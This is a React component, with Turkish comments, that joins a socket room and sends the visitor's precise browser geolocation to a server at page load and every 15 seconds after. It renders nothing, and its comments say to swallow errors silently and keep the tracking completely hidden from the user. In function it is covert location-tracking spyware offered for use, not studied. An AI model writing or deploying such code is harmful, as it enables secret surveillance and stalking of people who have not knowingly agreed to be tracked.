import React, { useEffect, useRef } from 'react';

function TrackPage({ socket, trackId }) {
  const intervalRef = useRef(null);

  useEffect(() => {
    socket.emit('join', trackId);

    function sendLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          pos => {
            socket.emit('location', {
              id: trackId,
              coords: pos.coords
            });
          },
          err => {
            // Sessizce hataı yoksay, kullanıcıya hiçbir şey gösterme
            console.log('Konum erişimi reddedildi');
          },
          { enableHighAccuracy: true, maximumAge: 10000, timeout: 5000 }
        );
      }
    }

    // İlk başlatmada hemen gönder
    sendLocation();
    // Sonra belirli aralıklarla gönder
    intervalRef.current = setInterval(sendLocation, 15000); // 15 saniye

    return () => {
      if (intervalRef.current) clearInterval(intervalRef.current);
    };
    // eslint-disable-next-line
  }, [trackId]);

  // Hiçbir şey gösterme, tamamen gizli
  return null;
}

export default TrackPage;
